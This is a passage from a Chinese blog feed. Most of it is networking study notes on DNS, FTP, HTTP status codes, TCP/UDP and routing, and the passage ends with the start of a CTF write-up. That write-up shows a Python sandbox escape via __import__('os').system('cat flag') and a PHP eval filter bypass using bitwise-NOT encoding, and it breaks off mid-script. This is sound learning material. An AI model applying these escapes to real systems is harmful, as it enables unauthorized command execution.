主要提供及时性服务。</li><li><strong>传输层提供的是端到端的通信，指的是运行在不同主机内的两个进程之间的通信，一个进程由一个端口来标识</strong></li></ul></li><li><strong>网络层</strong>：为分组交换网上的不同<strong>主机</strong>提供数据传输服务。而传输层协议是为主机中的进程提供数据传输服务。网络层把传输层传递下来的报文段或者用户数据报封装成<strong>分组</strong>。</li><li><strong>数据链路层</strong>：网络层针对的还是主机之间的数据传输服务，而主机之间可以有很多链路，链路层协议就是为同一链路的主机提供数据传输服务。在两个相邻结点间的链路上传送数据时，数据链路层将网络层交下来的IP数据报组装成帧，在两个相邻结点间的链路上传送帧（frame）</li><li><strong>物理层</strong>：考虑的是怎样在传输媒体上传输数据<strong>比特</strong>流，而不是指具体的传输媒体。物理层的作用是尽可能屏蔽传输媒体和通信手段的差异，使数据链路层感觉不到这些差异。</li></ul><h1 id="二、应用层"><a href="#二、应用层" class="headerlink" title="二、应用层"></a>二、应用层</h1><h2 id="网络应用模型"><a href="#网络应用模型" class="headerlink" title="网络应用模型"></a>网络应用模型</h2><h3 id="客户-服务器模型（C-S）"><a href="#客户-服务器模型（C-S）" class="headerlink" title="客户/服务器模型（C/S）"></a>客户/服务器模型（C/S）</h3><p>在C/S模型中，<strong>服务器</strong>总是打开，它服务于许多其他称为<strong>客户机</strong>的主机请求，工作流程：</p><ol><li>服务器处于接受请求的状态</li><li>客户机发出服务请求，并等待接受结果</li><li>服务器收到请求后，分析请求，进行必要的处理，得到结果并发送给客户机<h3 id="P2P模型"><a href="#P2P模型" class="headerlink" title="P2P模型"></a>P2P模型</h3>在P2P模型中，任意一对计算机称为对等机（Peer）,直接相互通信；</li></ol><h2 id="域名系统（DNS）"><a href="#域名系统（DNS）" class="headerlink" title="域名系统（DNS）"></a>域名系统（DNS）</h2><p>DNS系统采用C/S模型，其协议运行于UDP之上，使用53号端口。</p><p>DNS是一个分布式数据库，提供了主机名和 IP 地址之间相互转换的服务。这里的分布式数据库是指，每个站点只保留它自己的那部分数据。</p><p>DNS采用层次树状结构的命名方法：</p><p><img src="https://s2.loli.net/2022/03/06/jY2qlWv7Cwi4KxL.png" alt="image.png"></p><h3 id="域名服务器"><a href="#域名服务器" class="headerlink" title="域名服务器"></a>域名服务器</h3><ol><li><p>根域名服务器：管理顶级域（如.com）</p></li><li><p>顶级域名服务器：管理二级域名</p></li><li><p>授权域名服务器：将其管辖的主机名转化为该主机的IP地址</p></li><li><p>本地域名服务器：当一台主机发出DNS查询请求时，这个查询请求报文就发送给该主机的本地域名服务器</p><p><img src="https://s2.loli.net/2022/03/06/9NEm5oWGROp7sYA.png" alt="image.png"></p></li></ol><h3 id="域名解析过程"><a href="#域名解析过程" class="headerlink" title="域名解析过程"></a>域名解析过程</h3><p><img src="https://s2.loli.net/2022/03/06/8q5HbYwn9KTBRXF.png" alt="image.png"></p><h2 id="文件传输协议（FTP）"><a href="#文件传输协议（FTP）" class="headerlink" title="文件传输协议（FTP）"></a>文件传输协议（FTP）</h2><p>FTP提供交互式的访问，允许客户指明文件的<strong>类型与格式</strong>，并允许文件具有存取权限。</p><p>FTP采用C/S模型，使用TCP可靠传输服务</p><h3 id="控制连接与数据连接"><a href="#控制连接与数据连接" class="headerlink" title="控制连接与数据连接"></a>控制连接与数据连接</h3><p>FTP在工作时使用两个并行的TCP连接：一个是控制连接（端口21），一个是数据连接（端口20）：</p><p><img src="https://s2.loli.net/2022/03/06/uGeTzFsEKvmCUok.png" alt="image.png"></p><ul><li>控制连接：服务器打开端口号 21 等待客户端的连接，客户端主动建立连接后，使用这个连接将客户端的命令传送给服务器，并传回服务器的应答。</li><li>数据连接：20端口用来传送一个文件数据。</li></ul><p>因为FTP使用了一个分离的控制连接，所以也称FTP的控制信息为带外（Out-of-Band）传送的</p><h2 id="电子邮件"><a href="#电子邮件" class="headerlink" title="电子邮件"></a>电子邮件</h2><h3 id="电子邮件系统的组成结构"><a href="#电子邮件系统的组成结构" class="headerlink" title="电子邮件系统的组成结构"></a>电子邮件系统的组成结构</h3><p><img src="https://s2.loli.net/2022/03/06/NM79RuzZBpoUwTY.png" alt="image.png"></p><h3 id="SMTP"><a href="#SMTP" class="headerlink" title="SMTP"></a>SMTP</h3><p>SMTP使用TCP，端口25，为推协议</p><h3 id="POP3"><a href="#POP3" class="headerlink" title="POP3"></a>POP3</h3><p>邮件读取协议，拉协议，当用户读取邮件时，用户代理向邮件服务器发出请求，“拉”取用户邮箱中的邮件</p><h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><p>HTTP是无状态的，但采用TCP作为运输层协议，保证了数据的可靠传输。</p><p>HTTP既可以采用非持久连接，也可以采用持久连接（HTTP/1.1）</p><p><img src="https://s2.loli.net/2022/03/06/esrFiN7duQfvR38.png" alt="image.png"></p><ul><li>非持久：（2RTT + 文件传输时间）* 文档数</li><li>持久：<ul><li>流水线：RTT（用于TCP连接）+ RTT（连续请求多个文档）</li><li>非流水线：RTT + 请求文档数 * RTT</li></ul></li></ul><h3 id="HTTP报文结构"><a href="#HTTP报文结构" class="headerlink" title="HTTP报文结构"></a>HTTP报文结构</h3><p><img src="https://s2.loli.net/2022/03/08/TlJtWEDGZC2qx9j.png" alt="image.png"></p><h3 id="HTTP方法"><a href="#HTTP方法" class="headerlink" title="HTTP方法"></a>HTTP方法</h3><p>客户端发送的 <strong>请求报文</strong> 第一行为<strong>请求行</strong>，包含了方法字段。</p><ul><li>GET：获取资源；当前网络请求中，绝大部分使用的是 GET 方法。</li><li>HEAD：获取报文首部；和GET类似，但是不返回报文实体主体部分，主要用于确认URL的有效性以及资源的日期时间</li><li>POST：传输实体主体；POST主要用来传输数据，而GET主要用来获取资源</li><li>PUT：上传文件；由于自身不带验证机制，任何人都可以上传文件，因此存在安全性问题，一般不使用该方法。</li><li>DELETE：删除文件；不带验证机制</li></ul><h3 id="HTTP验证码"><a href="#HTTP验证码" class="headerlink" title="HTTP验证码"></a>HTTP验证码</h3><p>服务器返回的 <strong>响应报文</strong> 中第一行为<strong>状态行</strong>，包含了状态码以及原因短语，用来告知客户端请求的结果。</p><table><thead><tr><th>状态码</th><th>类别</th><th>含义</th></tr></thead><tbody><tr><td>1XX</td><td>Informational（信息性状态码）</td><td>接收的请求正在处理</td></tr><tr><td>2XX</td><td>Success（成功状态码）请求正常处理完毕</td><td>请求正常处理完毕</td></tr><tr><td>3XX</td><td>Redirection（重定向状态码）</td><td>需要进行附加操作以完成请求</td></tr><tr><td>4XX</td><td>Client Error（客户端错误状态码）</td><td>服务器无法处理请求</td></tr><tr><td>5XX</td><td>Server Error（服务器错误状态码）</td><td>服务器处理请求出错</td></tr></tbody></table><h4 id="1XX信息："><a href="#1XX信息：" class="headerlink" title="1XX信息："></a>1XX信息：</h4><ul><li>100 Continue ：表明到目前为止都很正常，客户端可以继续发送请求或者忽略这个响应。</li></ul><h4 id="2XX成功"><a href="#2XX成功" class="headerlink" title="2XX成功"></a>2XX成功</h4><ul><li>200 OK</li><li>204 No Content ：请求已经成功处理，但是返回的响应报文不包含实体的主体部分。一般在只需要从客户端往服务器发送信息，而不需要返回数据时使用。</li><li>206 Partial Content ：表示客户端进行了范围请求，响应报文包含由 Content-Range 指定范围的实体内容。</li></ul><h4 id="3XX-重定向"><a href="#3XX-重定向" class="headerlink" title="3XX 重定向"></a>3XX 重定向</h4><ul><li>301 Moved Permanently ：永久性重定向</li><li>302 Found ：临时性重定向</li><li>303 See Other ：和 302 有着相同的功能，但是 303 明确要求客户端应该采用 GET 方法获取资源。</li><li>注：虽然 HTTP 协议规定 301、302 状态下重定向时不允许把 POST 方法改成 GET 方法，但是大多数浏览器都会在 301、302 和 303 状态下的重定向把 POST 方法改成 GET 方法。</li><li>304 Not Modified ：如果请求报文首部包含一些条件，例如：If-Match，If-Modified-Since，If-None-Match，If-Range，If-Unmodified-Since，如果不满足条件，则服务器会返回 304 状态码。</li><li>307 Temporary Redirect ：临时重定向，与 302 的含义类似，但是 307 要求浏览器不会把重定向请求的 POST 方法改成 GET 方法。</li></ul><h4 id="4XX客户端错误"><a href="#4XX客户端错误" class="headerlink" title="4XX客户端错误"></a>4XX客户端错误</h4><ul><li>400 Bad Request ：请求报文中存在语法错误。</li><li>401 Unauthorized ：该状态码表示发送的请求需要有认证信息（BASIC 认证、DIGEST 认证）。如果之前已进行过一次请求，则表示用户认证失败。</li><li>403 Forbidden ：请求被拒绝。</li><li>404 Not Found</li></ul><h4 id="5XX服务器错误"><a href="#5XX服务器错误" class="headerlink" title="5XX服务器错误"></a>5XX服务器错误</h4><ul><li>500 Internal Server Error ：服务器正在执行请求时发生错误。</li><li>503 Service Unavailable ：服务器暂时处于超负载或正在进行停机维护，现在无法处理请求。</li></ul><h1 id="三、传输层"><a href="#三、传输层" class="headerlink" title="三、传输层"></a>三、传输层</h1><h2 id="传输层提供的服务"><a href="#传输层提供的服务" class="headerlink" title="传输层提供的服务"></a>传输层提供的服务</h2><h3 id="功能-1"><a href="#功能-1" class="headerlink" title="功能"></a>功能</h3><ol><li><p>提供应用进程之间的逻辑通信（<strong>端到端</strong>）</p><p><img src="https://s2.loli.net/2022/03/06/5k3LGJh1zw7VQpi.png" alt="image.png"></p></li><li><p>复用与分用：复用指发送方不同应用进程都可使用同一个传输层协议传送数据；分用指接收方的传输层在剥去报文的首部后能够把这些数据正确交付到目的应用进程</p></li><li><p>差错检测（首部和数据，TCP和UDP都要加上伪头部）</p></li><li><p>两种不同的传输协议：TCP和UDP</p></li></ol><h3 id="传输层的寻址和端口"><a href="#传输层的寻址和端口" class="headerlink" title="传输层的寻址和端口"></a>传输层的寻址和端口</h3><h4 id="端口的作用"><a href="#端口的作用" class="headerlink" title="端口的作用"></a>端口的作用</h4><p>端口能够让应用层的各种应用程序将其数据通过端口向下交付给传输层，以及让传输层知道应当将其报文段中的数据向上通过端口交付给应用层相应的进程</p><h4 id="端口号"><a href="#端口号" class="headerlink" title="端口号"></a>端口号</h4><ol><li><p>熟知端口号：0~1023</p><table><thead><tr><th>应用程序</th><th>FTP</th><th>TELNET</th><th>SMTP</th><th>DNS</th><th>TFTP</th><th>HTTP</th><th>SNMP</th></tr></thead><tbody><tr><td>熟知端口号</td><td>21</td><td>23</td><td>25</td><td>53</td><td>69</td><td>80</td><td>161</td></tr></tbody></table></li><li><p>客户端使用的：49152~65535</p></li></ol><h4 id="套接字"><a href="#套接字" class="headerlink" title="套接字"></a>套接字</h4><p>套接字 = (主机IP地址，端口号)</p><h3 id="无连接服务与面向连接服务"><a href="#无连接服务与面向连接服务" class="headerlink" title="无连接服务与面向连接服务"></a>无连接服务与面向连接服务</h3><p>TCP和UDP</p><h2 id="UDP协议"><a href="#UDP协议" class="headerlink" title="UDP协议"></a>UDP协议</h2><h3 id="UDP数据报"><a href="#UDP数据报" class="headerlink" title="UDP数据报"></a>UDP数据报</h3><p>优点：</p><ul><li>无需建立连接，因此无引入建立连接的时延</li><li>无连接状态</li><li>分组首部开销小，TCP为20B，UDP为8B</li><li>无拥塞控制，应用层更好地控制要发送的数据和发送时间</li></ul><p>UDP尽最大努力的交付（Best-effort），即不保证可靠交付。所有维护可靠性的工作由用户在<strong>应用层</strong>来完成。</p><h4 id="UDP首部格式"><a href="#UDP首部格式" class="headerlink" title="UDP首部格式"></a>UDP首部格式</h4><p>长度包括<strong>首部和数据</strong></p><p><img src="https://s2.loli.net/2022/03/07/lP27JXtVh1FHfbg.png" alt="image.png"></p><h3 id="UDP校验"><a href="#UDP校验" class="headerlink" title="UDP校验"></a>UDP校验</h3><p>在计算校验和时，要<strong>临时</strong>加上12B的<strong>伪头部</strong>，伪头部既不向下传送也不向上递交。这样校验和既检查了UDP数据报，又对IP数据报的源IP地址和目的IP地址进行了校验</p><p><img src="https://s2.loli.net/2022/03/07/YXJTk3Uq8sFzSnh.png" alt="image.png"></p><p>校验计算方法与IP数据报校验一样，都是<strong>二进制反码运算求和再取反</strong>。不同的是，IP数据报只检验IP数据报的首部，而UDP检验首部和数据.</p><p><a href="https://www.cnblogs.com/roccoshi/p/13033014.html">UDP校验和的计算方法</a></p><p><img src="https://img2020.cnblogs.com/blog/2053630/202006/2053630-20200602184140681-340477432.jpg"></p><h2 id="TCP协议"><a href="#TCP协议" class="headerlink" title="TCP协议"></a>TCP协议</h2><h3 id="TCP协议的特点"><a href="#TCP协议的特点" class="headerlink" title="TCP协议的特点"></a>TCP协议的特点</h3><ol><li>面向连接</li><li>点对点</li><li><strong>可靠的交付服务</strong></li><li>全双工通信：允许通信双方的应用进程在任何时候都能发送数据</li><li>面向字节流</li></ol><h3 id="TCP报文段"><a href="#TCP报文段" class="headerlink" title="TCP报文段"></a>TCP报文段</h3><p>整个TCP报文段作为IP数据报的数据部分</p><p>首部最短为20B</p><p><img src="https://s2.loli.net/2022/03/07/wDZp1MtJ4uKoYTk.png" alt="image.png"></p><ol><li>源端口和目的端口字段：各占2B</li><li>序号字段：4B。由于TCP面向字节流，所以传送的数据流的每个字节都编上一个序号。序号字段的值指的是本报文段所发送方的数据的第一个字节的序号</li><li>确认号字段：4B。期望受到对方的下一个报文段的数据的第一个字节的序号。若确认号为N，则说明到N-1为止的所有数据都已正确收到</li><li>数据偏移（即首部长度）：4bit，指出TCP报文段的数据起始处距离TCP报文段的起始处有多远；计算：首部长度*4B</li><li>保留字段</li><li>紧急位URG：URG=1，表明紧急指针字段有效</li><li>确认位ACK：当ACK=1时，确认号字段才有效。TCP规定，在连接建立后所有传送的报文段都必须把ACK置1</li><li>推送位PSH：接收TCP 收到 PSH=1的报文段，就尽快地交付给接收应用，而不再等到整个缓存都填满后再向上交付。</li><li>复位位RST：Reset：RST=1时，表明TCP连接中出现严重差错（如主机崩溃或其他因)，必须释放连接，然后再重新建立运输连接。</li><li>同步位SYN：同步SYN=1表明这是一个连接请求或连接接收报文</li><li>终止位FIN：用来释放一个连接</li><li><img src="https://s2.loli.net/2022/03/07/wfgOhar6QslqjC9.png" alt="image.png"></li></ol><h3 id="TCP连接管理"><a href="#TCP连接管理" class="headerlink" title="TCP连接管理"></a>TCP连接管理</h3><p><img src="https://s2.loli.net/2022/03/07/xMQJVNGLzeYhnt7.png" alt="image.png"></p><p>连接过程：</p><ul><li>首先B处于监听状态，等待客户的连接请求</li><li>A向B的TCP发送一个<strong>连接请求报文段</strong>，SYN=1，选择一个随机起始序号seq=x，称为<strong>SYN包</strong></li><li>B的TCP收到连接请求后，如同意连接，则发送<strong>确认报文段</strong>，SYN=1，ACK=1，seq=y（随机选择一个初始序号），ack=x+1，这个包又叫<strong>SYN-ACK包</strong></li><li>A收到确认报文段后，向B发出确认，ACK=1，seq=x+1，ack=y+1</li><li>B收到A的确认后，连接建立</li></ul><h4 id="三次握手的原因"><a href="#三次握手的原因" class="headerlink" title="三次握手的原因"></a>三次握手的原因</h4><div class="note note-success">            <p>第三次握手是为了防止失效的连接请求到达服务器，让服务器错误打开连接。</p><p>客户端发送的连接请求如果在网络中滞留，那么就会隔很长一段时间才能收到服务器端发回的连接确认。客户端等待一个超时重传时间之后，就会重新请求连接。但是这个滞留的连接请求最后还是会到达服务器，如果不进行三次握手，那么服务器就会打开两个连接。如果有第三次握手，客户端会忽略服务器之后发送的对滞留连接请求的连接确认，不进行第三次握手，因此就不会再次打开连接。</p>          </div><h3 id="TCP连接的释放"><a href="#TCP连接的释放" class="headerlink" title="TCP连接的释放"></a>TCP连接的释放</h3><p><img src="https://s2.loli.net/2022/03/07/GYnTvWCow8gSjxL.png" alt="image.png"></p><p>以下描述不讨论序号和确认号，因为序号和确认号的规则比较简单。并且不讨论 ACK，因为 ACK 在连接建立之后都为 1。</p><ul><li>A 发送连接释放报文，FIN=1。</li><li>B 收到之后发出确认，此时 TCP 属于半关闭状态，B 能向 A 发送数据但是 A 不能向 B 发送数据。</li><li>当 B 不再需要连接时，发送连接释放报文，FIN=1。</li><li>A 收到后发出确认，进入 TIME-WAIT 状态，等待 2 MSL（最大报文存活时间）后释放连接。</li><li>B 收到 A 的确认后释放连接。</li></ul><h4 id="四次挥手的原因"><a href="#四次挥手的原因" class="headerlink" title="四次挥手的原因"></a>四次挥手的原因</h4><div class="note note-info">            <p>客户端发送了 FIN 连接释放报文之后，服务器收到了这个报文，就进入了 CLOSE-WAIT 状态。这个状态是为了让服务器端发送还未传送完毕的数据，传送完毕之后，服务器会发送 FIN 连接释放报文。</p>          </div><h4 id="TIME-WAIT"><a href="#TIME-WAIT" class="headerlink" title="TIME_WAIT"></a>TIME_WAIT</h4><p>客户端接收到服务器端的 FIN 报文后进入此状态，此时并不是直接进入 CLOSED 状态，还需要等待一个时间计时器设置的时间 2MSL。这么做有两个理由：</p><ul><li>确保最后一个确认报文能够到达。如果 B 没收到 A 发送来的确认报文，那么就会重新<br>发送连接释放请求报文，A 等待一段时间就是为了处理这种情况的发生。</li><li>等待一段时间是为了让本连接持续时间内所产生的所有报文都从网络中消失，使得下一个新的连接不会出现旧的连接请求报文。</li></ul><h3 id="TCP可靠传输"><a href="#TCP可靠传输" class="headerlink" title="TCP可靠传输"></a>TCP可靠传输</h3><h4 id="1-序号"><a href="#1-序号" class="headerlink" title="1.序号"></a>1.序号</h4><p>TCP将数据视为一个<span class="label label-primary">无结构但有序的字节流</span>，序号建立在传送的字节流上，而不建立在报文段之上。<br><img src="https://s2.loli.net/2022/03/20/jqD57N1npbBrRVA.png" alt="image.png"></p><h4 id="2-确认"><a href="#2-确认" class="headerlink" title="2.确认"></a>2.确认</h4><p>确认号是期望收到对方的下一个报文段的数据的第一个字节的序号<br>TCP默认使用累计确认，只确认数据流中第一个丢失字节为止的字节</p><h4 id="3-重传"><a href="#3-重传" class="headerlink" title="3.重传"></a>3.重传</h4><ol><li><p>超时<br>一个报文段从发送再到接收到确认所经过的时间称为往返时间 RTT，加权平均往返时间 RTTs 计算如下：<br><img src="https://latex.codecogs.com/gif.latex?RTTs=(1-a)*(RTTs)+a*RTT"><br>其中，0 ≤ a ＜ 1，RTTs 随着 a 的增加更容易受到 RTT 的影响。<br>超时时间 RTO 应该略大于 RTTs，TCP 使用的超时时间计算如下：<br><img src="https://latex.codecogs.com/gif.latex?RTO=RTTs+4*RTT_d"><br>其中 RTTd 为偏差的加权平均值。</p></li><li><p>冗余ACK<br>冗余ACK就是再次确认某个报文段的ACK，而发送方先前已经收到过该报文段的确认。</p></li></ol><p>例如，发送方A发送了序号为1、2、3、4、5的TCP报文段，其中2号在链路中丢失；3、4、5到达B，但它们不是B所期望的下一个报文，于是B就发送3个对1号报文段的冗余ACK，表示自己期望收到2号报文段</p><p>TCP规定每当比期望序号大的失序报文段到达时，就发送一个冗余ACK，指明下一个期待字节的序号，当发送方收到对同一个报文段的3个冗余ACK时，就可以认为跟在这个被确认报文段之后的报文段已丢失</p><h3 id="TCP流量控制"><a href="#TCP流量控制" class="headerlink" title="TCP流量控制"></a>TCP流量控制</h3><p>TCP提供流量控制服务来消除发送方使接收方缓存区溢出的可能性，TCP提供一种基于滑动窗口协议的流量控制机制。</p><p>接收方根据接收缓存的大小，动态调整发送方的发送窗口大小：<span class="label label-primary">接收窗口rwnd</span></p><p>发送方根据对网络拥塞程序的估计确定<span class="label label-primary">拥塞窗口cwnd</span></p><h3 id="TCP拥塞控制"><a href="#TCP拥塞控制" class="headerlink" title="TCP拥塞控制"></a>TCP拥塞控制</h3><p>如果网络出现拥塞，分组将会丢失，此时发送方会继续重传，从而导致网络拥塞程度更高。因此当出现拥塞时，应当控制发送方的速率。这一点和流量控制很像，但是出发点不同。流量控制是为了让接收方能来得及接收，而拥塞控制是为了降低整个网络的拥塞程度。</p><p>TCP 主要通过四个算法来进行拥塞控制：<strong>慢开始</strong>、<strong>拥塞避免</strong>、<strong>快重传</strong>、<strong>快恢复</strong>。</p><p>发送方需维护以下两个窗口：</p><ol><li><p><strong>接收窗口rwnd</strong>，接收方根据目前接收缓存大小所许诺的最新窗口值，反映接收方的容量。由接收方放在TCP报头的窗口字段</p></li><li><p><strong>拥塞窗口cwnd</strong>，发送方根据自己估算的网络拥塞程度设置的窗口值</p></li></ol><div class="note note-success">            <p>发送窗口的上限值 = min[rwnd, cwnd]</p>          </div><p>为了便于讨论，做如下假设：</p><ul><li>接收方有足够大的接收缓存，因此不会发生流量控制；</li><li>虽然 TCP 的窗口基于字节，但是这里设窗口的大小单位为报文段。</li></ul><h4 id="1-慢开始和拥塞避免"><a href="#1-慢开始和拥塞避免" class="headerlink" title="1.慢开始和拥塞避免"></a>1.慢开始和拥塞避免</h4><ol><li><p>慢开始算法<br>发送的最初执行慢开始，令 cwnd = 1，发送方只能发送 1 个报文段；当收到确认后，将 cwnd 加倍，因此之后发送方能够发送的报文段数量为：2、4、8 …</p></li><li><p>拥塞避免算法<br>注意到慢开始每个轮次都将 cwnd 加倍，这样会让 cwnd 增长速度非常快，从而使得发送方发送的速度增长速度过快，网络拥塞的可能性也就更高。设置一个慢开始门限 ssthresh，当 cwnd &gt;= ssthresh 时，进入拥塞避免，每个轮次只将 cwnd 加 1。<br>如果出现了超时，则令 ssthresh = cwnd / 2，然后重新执行慢开始。</p></li></ol><p><img src="https://s2.loli.net/2022/03/20/mZONGtDX7kJsRTh.png"></p><h4 id="2-快重传与快恢复"><a href="#2-快重传与快恢复" class="headerlink" title="2.快重传与快恢复"></a>2.快重传与快恢复</h4><ol><li><p>快重传<br>当发送方连续收到三个重复的ACK报文时，直接重传对方尚未收到的报文段，而不必等待那个报文段设置的重传计时器超时</p></li><li><p>快恢复<br>发送端收到连续三个冗余ACK，执行“乘法减小”，将慢开始门限ssthresh设置为出现拥塞时发送方cwnd的一半。与慢开始（cwnd=1）不同的是，它将cwnd设置为ssthresh改变后的数值，然后开始执行拥塞避免（加法增大），使cwnd缓慢线性增大</p></li></ol><p><img src="https://s2.loli.net/2022/03/20/lcDyWkNQumagMRi.png"></p><h1 id="四、网络层"><a href="#四、网络层" class="headerlink" title="四、网络层"></a>四、网络层</h1><h2 id="网络层的功能"><a href="#网络层的功能" class="headerlink" title="网络层的功能"></a>网络层的功能</h2><h3 id="异构网络互联"><a href="#异构网络互联" class="headerlink" title="异构网络互联"></a>异构网络互联</h3><p>异构指的物理层和数据链路层不同</p><p>在路由器互联的多个局域网的结构中，要求每个局域网物理层、数据链路、网络层可以不同，但网络层其上必须相同；因为路由器为第3层设备，向传输层以上层次隐藏下层的具体实现。</p><p>将两个以上的计算机网络通过一定的方法，用一种或多种通信处理设备（中间设备）相互连接起来，以构成更大的网络系统：</p><ol><li>物理层中继系统：中继器、集线器（Hub）</li><li>数据链路层：网桥或交换机</li><li>网络层：路由器（router）</li><li>网络层以上：网关</li></ol><p>使用IP协议，可以把异构的物理网络连接起来，使得在网络层看起来好像一个统一的网络：<br><img src="https://s2.loli.net/2022/03/24/AHv4V6MQIWJxy2l.png" alt="image.png"></p><h3 id="路由与转发"><a href="#路由与转发" class="headerlink" title="路由与转发"></a>路由与转发</h3><p>路由器主要完成两个功能：</p><ol><li>路由选择：根据特定的路由选择协议，构造出路由表，同时经常或定期地和相邻路由器交换路由信息而不断地更新和维护路由表</li><li>分组转发：路由器根据转发表将用户的IP数据报从合适的端口转发出去</li></ol><h2 id="路由算法"><a href="#路由算法" class="headerlink" title="路由算法"></a>路由算法</h2><h3 id="静态路由与动态路由"><a href="#静态路由与动态路由" class="headerlink" title="静态路由与动态路由"></a>静态路由与动态路由</h3><ul><li>静态路由算法：网络管理员手工配置路由信息</li><li>动态路由算法：路由器上的路由表项是通过相互连接的路由器之间彼此交换信息，然后根据一定的算法优化出来的。</li></ul><h3 id="距离-向量路由算法"><a href="#距离-向量路由算法" class="headerlink" title="距离-向量路由算法"></a>距离-向量路由算法</h3><p>所有结点都定期地将它们的整个路由选择表传送给所有与之直接相连的结点。</p><p>路由选择表包含：</p><ul><li>每条路径的目的地</li><li>路径的代价</li></ul><h3 id="链路状态路由算法"><a href="#链路状态路由算法" class="headerlink" title="链路状态路由算法"></a>链路状态路由算法</h3><p>要求参与该算法的结点都具有完全的网络拓扑信息。在一个链路状态选择中，一个结点检查所有直接链路的状态，并将所得的状态信息发送给网上的所有结点，而不是仅送给那些直接相连的结点。每当链路状态报文到达时，结点就用这些信息去更新自己的网络拓扑和状态“视图”，一旦链路状态发生变化，结点就对更新的网络图利用Dijsktra最短路径算法重新计算路由，从单一的源出发计算到达所有目的结点的最短路径。</p><div class="note note-success">            <p>两者比较：在<strong>距离-向量</strong>中，每个结点仅与它的直接邻居交谈，它为它的邻居提供从自己到网络中所有其他结点的最低费用估计。在链路状态中，每个结点通过广播的方式与所有其他结点交谈，但它仅告诉他们与它直接相连的链路的费用。相较之下，距离-向量有可能遇到路由环路问题。</p>          </div><h3 id="层次路由"><a href="#层次路由" class="headerlink" title="层次路由"></a>层次路由</h3><p>将互联网划分为许多较小的自治系统（包含许多局域网），每个自治系统有权自主决定本系统内采用何种路由协议。</p><p>将路由协议分为两大类：</p><ol><li>一个自治系统内部所使用的路由协议称为：<span class="label label-primary">内部网关协议（IGP）</span>，有RIP和OSPF等</li><li>自治系统之间所使用的路由选择协议称为：<span class="label label-primary">外部网关协议</span>，用于在不同自治系统的路由器之间交换路由信息，并负责为分组在不同自治系统之间选择最优的路径。具体的协议有BGP</li></ol><p>在使用层次路由时，OSPF将整个网络划分为若干区域（Area），每个路由器都知道在本区域内如何把分组路由到目的地的细节，但不用知道其他区域的内部结构</p>]]></content>
    
    
    <categories>
      
      <category>计算机网络</category>
      
    </categories>
    
    
    <tags>
      
      <tag>计算机基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SCUCTF WriteUp</title>
    <link href="/2021/06/04/SCUCTF/"/>
    <url>/2021/06/04/SCUCTF/</url>
    
    <content type="html"><![CDATA[<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="get-me"><a href="#get-me" class="headerlink" title="get-me"></a>get-me</h2><p>python沙箱逃逸 :(<br><img src="https://i.loli.net/2021/06/05/LaSkuTB4YsUyK3q.png"><br>查看文件</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-built_in">__import__</span>(<span class="hljs-string">&quot;os&quot;</span>).system(<span class="hljs-string">&quot;ls&quot;</span>)<br></code></pre></div></td></tr></table></figure><p><img src="https://i.loli.net/2021/06/05/BMxvN2h6idbS7FD.png"><br>cat flag</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-built_in">__import__</span>(<span class="hljs-string">&quot;os&quot;</span>).system(<span class="hljs-string">&quot;cat flag&quot;</span>)<br></code></pre></div></td></tr></table></figure><p><img src="https://i.loli.net/2021/06/05/ewjBFDIaUXgJWkE.png"></p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="入门"><a href="#入门" class="headerlink" title="入门"></a>入门</h2><p>BP抓包看响应头<br><img src="https://i.loli.net/2021/06/05/ZRIGuU58OpnAWeC.png"></p><h2 id="shell-revenge"><a href="#shell-revenge" class="headerlink" title="shell_revenge"></a>shell_revenge</h2><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;eval&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$eval</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;eval&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/[0-9]|[a-z]|\^|\+|\||\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, <span class="hljs-variable">$eval</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$eval</span>&quot;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;hacker??&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></div></td></tr></table></figure><p>过滤了数字和字母，以及异或、或、与符号、[]、{}等，但是没有过滤按位取反符号~，可以将传入参数按位取反再url编码处理。<br>脚本如下：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>fwrite(STDOUT,<span class="hljs-string">&#x27;[+]your function: &#x27;</span>);<br><span class="hljs-variable">$system</span>=str_replace(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;\r\n&quot;</span>, <span class="hljs-string">&quot;\r&quot;</span>, <span class="hljs-string">&quot;\n&quot;</span>), <span class="hljs-string">&quot;&quot;</span>, fgets(STDIN));<br>fwrite(STDOUT,<span class="hljs-string">&#x27;[+]your command: 